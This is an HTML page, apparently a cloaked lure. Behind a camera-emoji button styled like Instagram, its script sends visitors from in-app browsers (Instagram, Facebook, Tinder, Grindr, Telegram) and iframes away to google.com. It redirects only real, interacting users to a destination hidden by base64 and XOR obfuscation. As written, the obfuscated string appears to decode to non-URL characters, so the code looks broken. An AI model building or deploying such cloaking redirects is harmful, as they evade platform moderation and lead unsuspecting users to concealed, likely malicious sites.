<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>📷</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      background: linear-gradient(to bottom, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
      font-family: system-ui, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .btn {
      background-color: white;
      color: black;
      border: none;
      border-radius: 9999px;
      padding: 1.5rem 3rem;
      font-size: 2rem;
      cursor: pointer;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
    }
  </style>
</head>
<body>
  <button class="btn" onclick="go()">📷</button>

  <script>
    // 🔐 Защита от встроенных браузеров
    (function() {
      const ua = navigator.userAgent.toLowerCase();
      const isWebview =
        ua.includes("instagram") ||
        ua.includes("fbav") ||
        ua.includes("facebook") ||
        ua.includes("tinder") ||
        ua.includes("okhttp") ||
        ua.includes("webview") ||
        ua.includes("line") ||
        ua.includes("pinterest") ||
        ua.includes("telegram") ||
        ua.includes("grindr");

      if (isWebview || window.top !== window.self) {
        window.location.href = "https://google.com";
        return;
      }
    })();

    // 👤 Проверка взаимодействия
    let interacted = false;
    document.addEventListener("mousemove", () => interacted = true);
    document.addEventListener("touchstart", () => interacted = true);
    document.addEventListener("keypress", () => interacted = true);

    // 🚀 Редирект с расшифровкой
    function go() {
      if (!interacted) return;

      setTimeout(() => {
        const encoded = "FDcVEhQbSRpVDBUbU0cME1BdDglbFlcHVRgBFQ=="; // XOR зашифрованный и base64 URL
        const xorKey = 3;

        const base64Decoded = atob(encoded);
        const finalURL = base64Decoded
          .split('')
          .map(c => String.fromCharCode(c.charCodeAt(0) ^ xorKey))
          .join('');

        window.location.href = finalURL;
      }, 2000);
    }
  </script>
</body>
</html>
